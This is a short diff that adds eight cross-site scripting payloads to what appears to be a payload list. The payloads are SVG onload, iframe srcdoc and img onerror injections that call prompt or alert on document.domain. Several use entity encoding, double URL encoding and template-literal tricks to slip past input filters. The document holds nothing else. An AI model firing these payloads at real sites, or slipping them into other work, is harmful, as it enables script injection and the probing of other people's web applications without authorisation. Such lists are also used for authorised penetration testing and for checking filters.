@@ -1,0 +1,8 @@
+<svg onload=prompt%26%230000000040document.domain)>
+<svg onload=prompt%26%23x000000028;document.domain)>
+<svg/OnLoad="`${prompt``}`">
+#.hta%253ciframe/srcdoc=<script/src="'-alert(document.domain)-'"></script>
+#../index.php/%2522%253E%253Ciframe/srcdoc=<script/src="'-alert(document.domain)-'"></script>/
+<svg/onload=%26nbsp;alert`bohdan`+
+1'"><img/src/onerror=.1|alert``>
+xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
